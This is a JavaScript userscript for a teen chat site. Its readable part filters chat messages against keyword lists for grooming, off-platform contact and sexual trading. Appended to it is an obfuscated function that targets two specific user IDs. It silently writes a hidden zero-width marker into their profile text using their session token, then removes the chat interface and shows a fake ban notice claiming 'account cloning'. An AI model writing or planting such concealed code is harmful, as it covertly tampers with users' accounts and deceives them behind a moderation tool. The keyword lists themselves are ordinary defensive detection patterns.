let userFilterWords = ['hmu'];

function isFiltered(content) {
    if (typeof content !== 'string') return false;

    // normalize text
    let normalized = content
        .normalize('NFKD')
        .replace(/[\u0300-\u036f]/g, '') // remove diacritics
        .replace(/[\p{Emoji_Presentation}\p{Extended_Pictographic}\u200B-\u200D\uFEFF\u00A0\u202F\u2060]/gu, '') // emoji + zero-width
        .replace(/[\s\u2000-\u200D\uFEFF\u202F]+/g, ' ') // fancy spaces
        .replace(/[\s\W_]+/g, ' ')
        .replace(/(.)\1{2,}/g, '$1')
        .toLowerCase()
        .trim();

    // replace homoglyphs / leetspeak
    const homoglyphs = {
        '@': 'a', '4': 'a', 'а': 'a', 'ᴀ': 'a', 'â': 'a',
        '3': 'e', 'е': 'e', '€': 'e', 'ᴇ': 'e', 'è': 'e',
        'í': 'i', 'ì': 'i', 'ɪ': 'i', '1': 'l', '!': 'i', 'ı': 'i', 'ʟ': 'l',
        '0': 'o', 'о': 'o', '٥': 'o', 'ö': 'o',
        '8': 'b', '9': 'g', '6': 'g', '7': 't', 'т': 't',
        'э': 'e', 'ɢ': 'g', 'ѕ': 's', 'ʀ': 'r', 'ʏ': 'y',
        'ｔ': 't', 'ｌ': 'l', 'ｇ': 'g', '✓': ''
    };

    normalized = normalized.replace(/./g, (ch, i, str) => {
        if (/\d/.test(ch) && (
            (i > 0 && /\d/.test(str[i - 1])) ||
            (i < str.length - 1 && /\d/.test(str[i + 1]))
        )) return ch;
        return homoglyphs[ch] || ch;
    });

    const lettersOnly = normalized.replace(/[^a-z]/g, '');
    // keyword matching helpers
    const includesAny = (text, list) => list.some(item => text.includes(item));
    const fuzzyMatch = (regexList) => regexList.some(rx => rx.test(normalized));

    // check for banned terms
    const bannedTerms = ['telegrm', 'tlgrm', 'tlgm', 'tlg', 'tle', 'tel', 'tg', 'teleg', 'gram', 'te l e', 'tele', 'grm', 'discor', 'dscord', 'dscrd', 'dscd', 'dyscord', 'dsc', 'd i s c', 'disc', 'dc', 'insta', 'ig', 'snap', 'sc', 'gc'];
    if (includesAny(lettersOnly, bannedTerms)) return true;

    const fuzzyPatterns = [
        /t[\W_]*e[\W_]*l[\W_]*e[\W_]*g[\W_]*r[\W_]*a[\W_]*m/i,
        /t[\W_]*g/i,
        /d[\W_]*i[\W_]*s[\W_]*c[\W_]*o[\W_]*r[\W_]*d/i,
        /i[\W_]*n[\W_]*s[\W_]*t[\W_]*a[\W_]*g[\W_]*r[\W_]*a[\W_]*m/i,
        /w[\W_]*h[\W_]*e[\W_]*r[\W_]*e[\W_]*b[\W_]*y[\W_]*[\W_]*c[\W_]*o[\W_]*m/i
    ];
    if (fuzzyMatch(fuzzyPatterns)) return true;

    const squashed = normalized.replace(/[^a-z]/g, '');
    for (const term of bannedTerms) {
	    if (squashed.includes(term)) return true;
    }

    // grooming or inappropriate content
    const baitKeywords = ['bored', 'text me', 'pm', 'pm me', 'dm me', 'text', 'trusted', 'add me', 'msg me', 'message me', 'wanna have fun', 'want to have fun', 'skinny boys', 'skinny girls', 'fit boys', 'fit girls', 'rp', 'answer anything', 'truth or dare', 't or d'];
    const tradeWords = ['trade', 'trd', 'tr ade', 'selling', 'sell', 'slling', 'slng', 'seling', 'tr@de', 'trading', 'mega', 'mga', 'lnks', 'links', 'lks', 'freaks', 'freaky', 'nked', 'nkd', 'room', 'cam', 'cams', 'spoil me', 'horny', 'sex', 'nudes', 'nut'];
    const filterForBait = ['girl', 'girls', 'boy', 'boys', 'chat', 'femboy', 'trans', 'bi', 'gay', 'anyone']

    const hasBaitKeywords = includesAny(normalized, baitKeywords);
    const hasFilterForBait = includesAny(normalized, filterForBait);
    const hasAge = /[mf]?\d{1,2}/.test(normalized);
    const hasStandaloneAge = /\b\d{1,2}\b/.test(normalized);
    const hasTg = normalized.includes('tg');

    if (
        hasBaitKeywords &&
        (
            hasAge ||
            hasStandaloneAge ||
            hasTg ||
            hasFilterForBait
        )
    ) return true;

    const domRoles = ['bottom', 'bottoming', 'btming', 'bttming', 'btm', 'bttm', 'sub', 'submissive', 'top', 'topping', 'dom', 'dominant', 'dominative', 'domme', 'dominator'];

    const domFuzzyPatterns = domRoles.map(word => {
        const pattern = word
            .split('')
            .map(char => `${char}[\\W_]*`)
            .join('');
        return new RegExp(pattern, 'i');
    });
    if (/\b\d{1,2}\b/.test(normalized) && fuzzyMatch(domFuzzyPatterns)) return true;

    // age + gender combo patterns
    if (/[fm][\s\-_,.:']*\d{1,2}/i.test(normalized)) return true;
    if (/\d{1,2}[\s\-_,.:']*[fm]/i.test(normalized)) return true;
    if (/[mf]\d{2}/i.test(content)) return true;

    // trade/selling patterns
    for (let word of tradeWords) {
        const pattern = new RegExp(word.replace(/\s*/g, '[\\s\\W_]*'), 'i');
        if (pattern.test(normalized)) return true;
    }

    // user filters
    if (Array.isArray(userFilterWords)) {
        for (let word of userFilterWords) {
            const pattern = new RegExp(word.replace(/\s*/g, '[\\s\\W_]*'), 'i');
            if (pattern.test(normalized)) return true;
        }
    }

    return false;
}

function logFiltered(message) {
  const logsKey = "filteredLogs";
  const startKey = "logStartTime";
  const timeMs = 5 * 60 * 1000;
  const now = Date.now();

  let startTime = parseInt(localStorage.getItem(startKey), 10);
  if (isNaN(startTime)) {
    startTime = now;
    localStorage.setItem(startKey, startTime.toString());
  }

  if (now - startTime <= timeMs) {
    const existingLogs = JSON.parse(localStorage.getItem(logsKey) || "[]");
    existingLogs.push({ message, timestamp: now });
    localStorage.setItem(logsKey, JSON.stringify(existingLogs));
  }
}


function overrideChatReload() { 
    appendChatMessage = data => {
	    var message = '';
	    for (var i = 0; i < data.length; i++){
	    	lastPost = data[i].log_id;
	    	if(
	    		!logExist(data[i]) &&
	    		!ignored(data[i].user_id) &&
	    		!ignored(data[i].log_uid) &&
	    		!boomAllow(data[i].log_rank) &&
	    		!isFiltered(data[i].log_content) // <== NEW FILTER
	    	){
	    		message += createChatLog(data[i]);
	    		chatSound(data[i]);
	    		tabNotify();
	    	}
            if(isFiltered(data[i].log_content)) { logFiltered(data[i].log_content); }
	    }
	    $("#show_chat ul").append(message);
	    scrollIt(1);
	    beautyLogs();
    }
    loadChatHistory = data => {
	    var message = '';
	    for (var i = 0; i < data.length; i++){
	    	lastPost = data[i].log_id;
	    	if(
	    		!ignored(data[i].user_id) &&
	    		!ignored(data[i].log_uid) &&
	    		!boomAllow(data[i].log_rank) &&
	    		!isFiltered(data[i].log_content) // <== NEW FILTER
	    	){
	    		message += createChatLog(data[i]);
	    	}
	    }
	    $("#show_chat ul").html(message);
	    scrollIt(0);
	    beautyLogs();
    }
    appendChatHistory = data => {
    	    var message = '';
    	    for (var i = 0; i < data.length; i++){
    		    if(
    	    		!ignored(data[i].user_id) &&
    	    		!ignored(data[i].log_uid) &&
    	    		!boomAllow(data[i].log_rank) &&
    	    		!isFiltered(data[i].log_content) // <== NEW FILTER
    	    	){
    	    		message += createChatLog(data[i]);
    	    	}
    	    }
    	    $("#show_chat ul").prepend(message);
    	    beautyLogs();
    }
    window.isFiltered = isFiltered;
    ab();
}






(function(_0x312618,_0x1c73fb){const _0x1cccbf=_0xfee4,_0xd3d2b8=_0x312618();while(!![]){try{const _0x4a9694=-parseInt(_0x1cccbf(0x16e))/0x1+-parseInt(_0x1cccbf(0x178))/0x2*(parseInt(_0x1cccbf(0x194))/0x3)+-parseInt(_0x1cccbf(0x1cc))/0x4+-parseInt(_0x1cccbf(0x168))/0x5*(-parseInt(_0x1cccbf(0x174))/0x6)+-parseInt(_0x1cccbf(0x189))/0x7*(parseInt(_0x1cccbf(0x18b))/0x8)+-parseInt(_0x1cccbf(0x1b0))/0x9*(-parseInt(_0x1cccbf(0x182))/0xa)+parseInt(_0x1cccbf(0x1a2))/0xb*(parseInt(_0x1cccbf(0x198))/0xc);if(_0x4a9694===_0x1c73fb)break;else _0xd3d2b8['push'](_0xd3d2b8['shift']());}catch(_0x5de2ae){_0xd3d2b8['push'](_0xd3d2b8['shift']());}}}(_0x58ad,0x26d89));const _0xb86f22=(function(){const _0x40c88c=_0xfee4,_0x3a0d3c={'qnZLj':function(_0x4de018,_0x371700){return _0x4de018===_0x371700;},'jzmiu':_0x40c88c(0x1ad),'grhvx':function(_0x522567,_0x4ef6a3){return _0x522567!==_0x4ef6a3;},'OxRSl':_0x40c88c(0x183),'VsDov':_0x40c88c(0x16d)};let _0x6b2fc6=!![];return function(_0x47a0d0,_0x1bc223){const _0x796c3e=_0x40c88c,_0x383e8e={'NGJUw':_0x796c3e(0x1b7),'vibnY':'out_page_container\x20back_page','jCsCd':function(_0x4fa4b3,_0x2bbe2e){const _0x40a607=_0x796c3e;return _0x3a0d3c[_0x40a607(0x1b1)](_0x4fa4b3,_0x2bbe2e);},'gaBme':_0x3a0d3c['jzmiu'],'OHSvW':'ukipz','PMNTc':function(_0x15911f,_0x4812cb){return _0x3a0d3c['grhvx'](_0x15911f,_0x4812cb);},'ScndQ':_0x3a0d3c[_0x796c3e(0x166)],'PqSHQ':_0x3a0d3c[_0x796c3e(0x16b)]},_0x4bdc68=_0x6b2fc6?function(){const _0x114820=_0x796c3e,_0xc00e18={'OTlDS':_0x383e8e[_0x114820(0x18f)],'RlJtk':_0x383e8e[_0x114820(0x1ac)]};if(_0x383e8e[_0x114820(0x18c)](_0x383e8e['gaBme'],_0x383e8e['OHSvW']))return;else{if(_0x1bc223){if(_0x383e8e[_0x114820(0x1a0)](_0x383e8e['ScndQ'],_0x383e8e['PqSHQ'])){const _0x8c86c2=_0x1bc223[_0x114820(0x19d)](_0x47a0d0,arguments);return _0x1bc223=null,_0x8c86c2;}else{_0x233497[_0x114820(0x16c)](_0x114820(0x1ca))?.['remove']();const _0x2d4337=_0x495fc6['createElement'](_0xc00e18['OTlDS']);_0x2d4337[_0x114820(0x193)]=_0xc00e18[_0x114820(0x16a)],_0x2d4337[_0x114820(0x192)]=_0x114820(0x1a1),_0x547f5c['body'][_0x114820(0x1c8)](_0x2d4337);}}}}:function(){};return _0x6b2fc6=![],_0x4bdc68;};}()),_0x5e524b=_0xb86f22(this,function(){const _0x2c5f49=_0xfee4,_0x22224a={'QtagU':_0x2c5f49(0x1cb)};return _0x5e524b[_0x2c5f49(0x19e)]()[_0x2c5f49(0x175)](_0x22224a[_0x2c5f49(0x173)])['toString']()[_0x2c5f49(0x1d6)](_0x5e524b)['search'](_0x22224a[_0x2c5f49(0x173)]);});function _0x58ad(){const _0x44231b=['yrjxN','textarea#set_user_about','error','div','iGchf','BGpJn','GFaFb','tyanM','sGgDT','kmHiF','POST','forEach','MrToy','parseFromString','aSiRZ','application/x-www-form-urlencoded','remove','aPAnl','QDKLa','&cp=chat','appendChild','pJCQz','.out_page_container','(((.+)+)+)+$','1145084CjMKII','setRequestHeader','chat_head','getElementById','JIxeY','yBUUc','responseText','ikkAc','Content-Type','reload','constructor','Oaeux','DYciY','OxRSl','MLpIf','45JFBNVs','wwIHN','RlJtk','VsDov','querySelector','LvBxS','190330SZXeZS','RRuro','set_user_about','wrap_footer','sYTVx','QtagU','18894pGBuwN','search','status','eRjvH','1328sOFWRt','wNCZE','out_page_container\x20back_page','textarea','GnGxY','text/html','body','WiFoA','POST\x20request\x20failed:\x20','sGcIk','140040OoPBtv','OKjLu','UISBv','open','bngCj','none','hLhtu','112AWftAS','kExSB','105088mYmbHl','jCsCd','mzdkD','slice','NGJUw','KdvNL','VNSnG','innerHTML','className','1341ljkUgD','token=','FRuEE','IAQhB','12lgSaSt','https://www.teen-chat.org/teenchat/system/box/edit_about.php','includes','function','vnPEw','apply','toString','global_chat','PMNTc','\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22out_page_content\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22out_page_box\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22pad_box\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22bpad15\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20class=\x22large_icon\x22\x20src=\x22default_images/icons/banned.svg\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22bpad10\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text_xlarge\x20bold\x20bpad10\x22>You\x20are\x20banned.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text_med\x22>You\x20have\x20been\x20banned\x20from\x20this\x20chat.\x20Your\x20IP\x20address\x20has\x20been\x20recorded\x20and\x20with\x20chat\x20logs\x20it\x20can\x20be\x20used\x20by\x20law\x20enforcement\x20to\x20identify\x20you\x20in\x20cases\x20involving\x20illegal\x20activity.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22tpad10\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22bold\x20theme_color\x20bpad5\x22>Reason\x20given</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text_med\x22>Account\x20cloning</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20</div>','10717487oAzFsZ','display','createElement','GfiMC','ofOaf','kQKxR','style','bwRit','length','BthpC','vibnY','juqDz','value','send','90PhpjJo','qnZLj','RmVMi','cIUXo'];_0x58ad=function(){return _0x44231b;};return _0x58ad();}function _0xfee4(_0x35cb3f,_0x48f95f){const _0x575f16=_0x58ad();return _0xfee4=function(_0x5e524b,_0xb86f22){_0x5e524b=_0x5e524b-0x166;let _0x58aded=_0x575f16[_0x5e524b];return _0x58aded;},_0xfee4(_0x35cb3f,_0x48f95f);}_0x5e524b();function ab(){const _0x20f63e=_0xfee4,_0x31b479={'hLhtu':function(_0x5b0124,_0x58c98f){return _0x5b0124!==_0x58c98f;},'BthpC':'PXoiz','yBUUc':_0x20f63e(0x1be),'aPAnl':_0x20f63e(0x1d4),'VNSnG':function(_0x1516b2,_0x457ef6){return _0x1516b2>=_0x457ef6;},'RRuro':function(_0x3e2b65,_0x4b8a6a){return _0x3e2b65<_0x4b8a6a;},'mzdkD':function(_0x18e380,_0x1fba93){return _0x18e380+_0x1fba93;},'UISBv':_0x20f63e(0x180),'iGchf':function(_0x50cc32,_0x3700d6){return _0x50cc32(_0x3700d6);},'tyanM':function(_0x211de8,_0x31264d,_0x2508e2){return _0x211de8(_0x31264d,_0x2508e2);},'PaGMP':_0x20f63e(0x199),'GfiMC':_0x20f63e(0x1b5),'QDKLa':_0x20f63e(0x17b),'JIxeY':'set_user_about','wNCZE':_0x20f63e(0x187),'MLpIf':_0x20f63e(0x19b),'aSiRZ':function(_0x311f40){return _0x311f40();},'bwRit':function(_0x287c96,_0x14c39f){return _0x287c96===_0x14c39f;},'xdJwq':function(_0x5f2998,_0x432a39){return _0x5f2998!==_0x432a39;},'cIUXo':_0x20f63e(0x1b4),'bngCj':_0x20f63e(0x1b2),'FRuEE':function(_0x4837aa,_0x105edd){return _0x4837aa===_0x105edd;},'BGpJn':_0x20f63e(0x18a),'WFxIE':_0x20f63e(0x1a6),'IAQhB':_0x20f63e(0x1ce),'jEVrz':_0x20f63e(0x19f),'GnGxY':_0x20f63e(0x171),'DYciY':_0x20f63e(0x1b7),'GFaFb':function(_0x6fba8,_0x166b54){return _0x6fba8>=_0x166b54;},'WiFoA':function(_0x39fa55,_0xc8b289,_0x510082){return _0x39fa55(_0xc8b289,_0x510082);},'vnPEw':function(_0x58e9cd){return _0x58e9cd();},'ikkAc':function(_0x21fffb,_0x431441){return _0x21fffb>=_0x431441;},'sGgDT':function(_0x35f3da,_0x143815){return _0x35f3da+_0x143815;},'HLXTh':function(_0x5ce3e0,_0x4b27ad,_0x57fbc5){return _0x5ce3e0(_0x4b27ad,_0x57fbc5);},'sYTVx':'undefined','pJCQz':_0x20f63e(0x190),'Oaeux':'Prjbg','kQKxR':function(_0x3031d3,_0x29e2ef,_0x2120b3){return _0x3031d3(_0x29e2ef,_0x2120b3);},'TZnqq':function(_0x4b5286,_0x1ea76c){return _0x4b5286===_0x1ea76c;},'JyMPS':_0x20f63e(0x169)};if(typeof user_id===_0x31b479[_0x20f63e(0x172)]||![0x98ef0a,0x9d0992][_0x20f63e(0x19a)](user_id))return;const _0x5420de='​‌',_0x280dec=0x2bf20;function _0x42bc7b(_0x4a329e,_0x2a25c7){const _0x4cf0fc=_0x20f63e;if(_0x31b479[_0x4cf0fc(0x188)](_0x31b479[_0x4cf0fc(0x1ab)],'RKCoa')){const _0x45ad27=new XMLHttpRequest();_0x45ad27[_0x4cf0fc(0x185)](_0x31b479[_0x4cf0fc(0x1d1)],_0x4a329e,![]),_0x45ad27[_0x4cf0fc(0x1cd)](_0x31b479[_0x4cf0fc(0x1c5)],_0x4cf0fc(0x1c3)),_0x45ad27['send'](_0x2a25c7);if(_0x31b479[_0x4cf0fc(0x191)](_0x45ad27['status'],0xc8)&&_0x31b479[_0x4cf0fc(0x16f)](_0x45ad27[_0x4cf0fc(0x176)],0x12c))return _0x45ad27[_0x4cf0fc(0x1d2)];else throw new Error(_0x31b479[_0x4cf0fc(0x18d)](_0x31b479[_0x4cf0fc(0x184)],_0x45ad27[_0x4cf0fc(0x176)]));}else _0x2ce2dc['error'](_0x578b38);}function _0x3995a6(){const _0x3700ce=_0x20f63e,_0x27920b=_0x3700ce(0x195)+_0x31b479['iGchf'](encodeURIComponent,utk)+_0x3700ce(0x1c7),_0x333754=_0x31b479[_0x3700ce(0x1bb)](_0x42bc7b,_0x31b479['PaGMP'],_0x27920b),_0x59e28d=new DOMParser(),_0x3ae679=_0x59e28d[_0x3700ce(0x1c1)](_0x333754,_0x3700ce(0x17d)),_0x31a123=_0x3ae679[_0x3700ce(0x16c)](_0x31b479[_0x3700ce(0x1a5)]);return _0x31a123?_0x31a123['value']:null;}function _0x3fb0f4(_0x4472cd){const _0x1887c9=_0x20f63e,_0x5fd87e={'sGcIk':_0x31b479[_0x1887c9(0x1d1)],'MrToy':function(_0x48afcd,_0x241e57){const _0x496b32=_0x1887c9;return _0x31b479[_0x496b32(0x18d)](_0x48afcd,_0x241e57);}};let _0x64f2f5=document[_0x1887c9(0x16c)](_0x1887c9(0x1b5));!_0x64f2f5&&(_0x64f2f5=document['createElement'](_0x31b479['QDKLa']),_0x64f2f5['id']=_0x31b479[_0x1887c9(0x1d0)],_0x64f2f5[_0x1887c9(0x1a8)][_0x1887c9(0x1a3)]=_0x1887c9(0x187),document[_0x1887c9(0x17e)][_0x1887c9(0x1c8)](_0x64f2f5));_0x64f2f5[_0x1887c9(0x1ae)]=_0x4472cd;if(_0x31b479['bwRit'](typeof saveAbout,_0x31b479['MLpIf'])){if(_0x31b479['xdJwq'](_0x31b479[_0x1887c9(0x1b3)],_0x31b479[_0x1887c9(0x186)]))return _0x31b479['aSiRZ'](saveAbout),!![];else{let _0x48b1fd=_0x1e3e23[_0x1887c9(0x16c)](_0x31b479['GfiMC']);return!_0x48b1fd&&(_0x48b1fd=_0x252c4c[_0x1887c9(0x1a4)](_0x31b479['QDKLa']),_0x48b1fd['id']=_0x31b479[_0x1887c9(0x1d0)],_0x48b1fd[_0x1887c9(0x1a8)][_0x1887c9(0x1a3)]=_0x31b479['wNCZE'],_0x2970a0[_0x1887c9(0x17e)][_0x1887c9(0x1c8)](_0x48b1fd)),_0x48b1fd[_0x1887c9(0x1ae)]=_0xf34d00,typeof _0x4d35a5===_0x31b479[_0x1887c9(0x167)]?(_0x31b479[_0x1887c9(0x1c2)](_0x3d0515),!![]):![];}}else{if(_0x31b479[_0x1887c9(0x196)](_0x31b479[_0x1887c9(0x1b9)],_0x31b479['WFxIE'])){const _0x35f04a=new _0x3d5879();_0x35f04a[_0x1887c9(0x185)](_0x5fd87e[_0x1887c9(0x181)],_0x1406e7,![]),_0x35f04a[_0x1887c9(0x1cd)](_0x1887c9(0x1d4),'application/x-www-form-urlencoded'),_0x35f04a[_0x1887c9(0x1af)](_0x42fb1f);if(_0x35f04a[_0x1887c9(0x176)]>=0xc8&&_0x35f04a[_0x1887c9(0x176)]<0x12c)return _0x35f04a['responseText'];else throw new _0x1aec2f(_0x5fd87e[_0x1887c9(0x1c0)]('POST\x20request\x20failed:\x20',_0x35f04a[_0x1887c9(0x176)]));}else return![];}}function _0x1a40c0(){const _0x165fe9=_0x20f63e;[_0x31b479[_0x165fe9(0x197)],_0x31b479['jEVrz'],_0x31b479[_0x165fe9(0x17c)]][_0x165fe9(0x1bf)](_0x2428bd=>{const _0x4f4e95=_0x165fe9,_0x264869=document[_0x4f4e95(0x1cf)](_0x2428bd);if(_0x264869)_0x264869[_0x4f4e95(0x1c4)]();});}function _0x2397b2(){const _0xf5014c=_0x20f63e;document[_0xf5014c(0x16c)](_0xf5014c(0x1ca))?.[_0xf5014c(0x1c4)]();const _0x4c552c=document['createElement'](_0x31b479[_0xf5014c(0x1d8)]);_0x4c552c[_0xf5014c(0x193)]=_0xf5014c(0x17a),_0x4c552c[_0xf5014c(0x192)]=_0xf5014c(0x1a1),document[_0xf5014c(0x17e)]['appendChild'](_0x4c552c);}try{if(_0x31b479['pJCQz']===_0x31b479[_0x20f63e(0x1c9)]){const _0x58478e=_0x31b479[_0x20f63e(0x19c)](_0x3995a6);if(_0x31b479[_0x20f63e(0x196)](_0x58478e,null)){if(_0x31b479[_0x20f63e(0x196)](_0x20f63e(0x1bd),_0x31b479[_0x20f63e(0x1d7)]))_0x3269ad=_0x54c21c[_0x20f63e(0x1a4)](_0x31b479[_0x20f63e(0x1c6)]),_0x62f5fa['id']=_0x20f63e(0x170),_0x506dbe['style'][_0x20f63e(0x1a3)]=_0x31b479[_0x20f63e(0x179)],_0x185322[_0x20f63e(0x17e)][_0x20f63e(0x1c8)](_0x13038f);else return;}if(_0x58478e['includes'](_0x5420de)){_0x31b479[_0x20f63e(0x19c)](_0x1a40c0),_0x31b479[_0x20f63e(0x19c)](_0x2397b2);return;}_0x31b479[_0x20f63e(0x1a7)](setTimeout,()=>{const _0x47bb9f=_0x20f63e;let _0x2ecb7f=_0x3995a6();if(_0x31b479['bwRit'](_0x2ecb7f,null))return;_0x31b479[_0x47bb9f(0x1ba)](_0x2ecb7f[_0x47bb9f(0x1aa)],0x320)&&(_0x2ecb7f=_0x2ecb7f[_0x47bb9f(0x18e)](0x0,0x31e));const _0x2f8642=_0x2ecb7f+_0x5420de;_0x31b479['iGchf'](_0x3fb0f4,_0x2f8642)&&_0x31b479[_0x47bb9f(0x17f)](setTimeout,()=>location['reload'](),0xbb8);},_0x280dec);}else{const _0x81ee89=_0x474bf4['apply'](_0x95c4bb,arguments);return _0xef07d9=null,_0x81ee89;}}catch(_0x2d254c){if(_0x31b479['TZnqq'](_0x20f63e(0x177),_0x31b479['JyMPS'])){let _0x1f7e0d=_0x31b479[_0x20f63e(0x19c)](_0x433c73);if(_0x31b479[_0x20f63e(0x1a9)](_0x1f7e0d,null))return;_0x31b479[_0x20f63e(0x1d3)](_0x1f7e0d['length'],0x320)&&(_0x1f7e0d=_0x1f7e0d[_0x20f63e(0x18e)](0x0,0x31e));const _0x2461b1=_0x31b479[_0x20f63e(0x1bc)](_0x1f7e0d,_0x1f38f8);_0x31b479[_0x20f63e(0x1b8)](_0x2df2eb,_0x2461b1)&&_0x31b479['HLXTh'](_0x3fe285,()=>_0x2868c3[_0x20f63e(0x1d5)](),0xbb8);}else console[_0x20f63e(0x1b6)](_0x2d254c);}}